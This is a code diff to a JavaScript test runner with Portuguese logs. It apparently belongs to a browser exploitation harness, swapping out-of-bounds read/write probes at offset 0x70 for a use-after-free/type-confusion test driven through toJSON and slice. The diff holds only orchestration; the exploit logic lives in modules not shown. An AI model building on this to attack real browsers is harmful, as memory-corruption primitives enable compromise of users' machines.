@@ -1,64 +1,54 @@
 // js/script3/runAllAdvancedTestsS3.mjs
 import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
 import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
-// Atualize para a nova função de teste
-import { executeReadWriteVerificationAtOffset } from './testReadWriteAtOffset.mjs'; 
+// A função detailed_toJSON_for_UAF_TC_test_WithDepthControl_AndSlice está agora em testJsonTypeConfusionUAFSpeculative.mjs
+// e é usada por executeUAFTypeConfusionTestWithValue.
+import { executeUAFTypeConfusionTestWithValue } from './testJsonTypeConfusionUAFSpeculative.mjs';
 import { OOB_CONFIG } from '../config.mjs'; 
-import { AdvancedInt64, toHex } from '../utils.mjs'; // toHex não é mais necessário aqui diretamente
+import { toHex } from '../utils.mjs';
 
-async function runFocusedReadWriteTests() {
-    const FNAME_RUNNER = "runFocusedReadWriteTests";
-    logS3(`==== INICIANDO Testes Focados de Leitura/Escrita em Offsets Específicos ====`, 'test', FNAME_RUNNER);
 
-    const criticalOffset = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
+async function runUAFTC_With_ToJSON_DepthControlAndSlice() {
+    const FNAME_RUNNER = "runUAFTC_With_ToJSON_DepthControlAndSlice";
+    logS3(`==== INICIANDO Teste UAF/TC com toJSON Detalhada, Controle de Profundidade e Teste Slice ====`, 'test', FNAME_RUNNER);
 
-    // Teste 1: Ler, escrever 0xFFFFFFFF em 0x70, ler de volta, testar DataView
-    logS3(`\n--- Testando R/W em Offset Crítico ${toHex(criticalOffset)} com valor 0xFFFFFFFF ---`, 'subtest', FNAME_RUNNER);
-    await executeReadWriteVerificationAtOffset(
-        `RW_Verify_Offset_${toHex(criticalOffset)}_Val_FFFF`,
-        criticalOffset, 
-        0xFFFFFFFF,             
-        4                       // bytesToReadWrite (para DWORD)
-    );
-    await PAUSE_S3(MEDIUM_PAUSE_S3);
+    const criticalValue = 0xFFFFFFFF; 
+    const testDescription = `UAFTC_DepthCtrlSlice_Val_FFFF_Offset0x70`;
 
-    // Teste 2: Ler, escrever 0x0 em 0x70, ler de volta, testar DataView
-    logS3(`\n--- Testando R/W em Offset Crítico ${toHex(criticalOffset)} com valor 0x0 ---`, 'subtest', FNAME_RUNNER);
-    await executeReadWriteVerificationAtOffset(
-        `RW_Verify_Offset_${toHex(criticalOffset)}_Val_0000`,
-        criticalOffset, 
-        0x00000000,             
-        4                       // bytesToReadWrite
-    );
-    await PAUSE_S3(MEDIUM_PAUSE_S3);
+    logS3(`\n--- Executando Teste UAF/TC: ${testDescription} ---`, 'subtest', FNAME_RUNNER);
     
-    // Teste 3: Investigar 8 bytes em 0x70
-    logS3(`\n--- Investigando 8 bytes em Offset ${toHex(criticalOffset)} com escrita 0xFF...FF (QWORD) ---`, 'subtest', FNAME_RUNNER);
-    await executeReadWriteVerificationAtOffset(
-        `RW_Verify_Offset_${toHex(criticalOffset)}_Val_FFFF_QWORD`,
-        criticalOffset, 
-        new AdvancedInt64("0xFFFFFFFFFFFFFFFF"), // Escrever QWORD
-        8                                        // Ler/Escrever QWORD
+    let result = await executeUAFTypeConfusionTestWithValue(
+        testDescription,
+        criticalValue
     );
+
+    if (result.potentiallyFroze) {
+        logS3(`   RESULTADO ${testDescription}: CONGELAMENTO POTENCIAL. Chamadas toJSON: ${result.calls}`, "error", FNAME_RUNNER);
+    } else if (result.errorOccurred) {
+        logS3(`   RESULTADO ${testDescription}: ERRO JS CAPTURADO. Chamadas toJSON: ${result.calls}`, "warn", FNAME_RUNNER);
+    } else {
+        logS3(`   RESULTADO ${testDescription}: Completou. Chamadas toJSON: ${result.calls}`, "good", FNAME_RUNNER);
+        logS3(`      Stringify Result: ${String(result.stringifyResult).substring(0,200)}`, "info", FNAME_RUNNER);
+    }
     await PAUSE_S3(MEDIUM_PAUSE_S3);
+    logS3(`   Título da página após teste ${testDescription}: ${document.title}`, "info");
 
-
-    logS3(`==== Testes Focados de Leitura/Escrita CONCLUÍDOS ====`, 'test', FNAME_RUNNER);
+    logS3(`==== Teste UAF/TC com toJSON Detalhada, Controle de Profundidade e Teste Slice CONCLUÍDO ====`, 'test', FNAME_RUNNER);
 }
 
 export async function runAllAdvancedTestsS3() {
-    const FNAME = 'runAllAdvancedTestsS3_ReadWriteVerify'; 
+    const FNAME = 'runAllAdvancedTestsS3_UAFTC_DepthCtrlSlice'; 
     const runBtn = getRunBtnAdvancedS3();
     const outputDiv = getOutputAdvancedS3();
 
     if (runBtn) runBtn.disabled = true;
     if (outputDiv) outputDiv.innerHTML = '';
 
-    logS3(`==== INICIANDO Script 3: Testes Focados de Leitura/Escrita em Offsets Específicos ====`,'test', FNAME);
-    document.title = "Iniciando Script 3 - Testes R/W em Offset";
+    logS3(`==== INICIANDO Script 3: Teste UAF/TC com toJSON Detalhada, Ctrl Profundidade e Teste Slice ====`,'test', FNAME);
+    document.title = "Iniciando Script 3 - UAF/TC com Ctrl Profundidade e Slice";
     
-    await runFocusedReadWriteTests(); 
+    await runUAFTC_With_ToJSON_DepthControlAndSlice();
     
-    logS3(`\n==== Script 3 CONCLUÍDO (Testes Focados de Leitura/Escrita em Offsets Específicos) ====`,'test', FNAME);
+    logS3(`\n==== Script 3 CONCLUÍDO (Teste UAF/TC com toJSON Detalhada, Ctrl Profundidade e Teste Slice) ====`,'test', FNAME);
     if (runBtn) runBtn.disabled = false;
 }
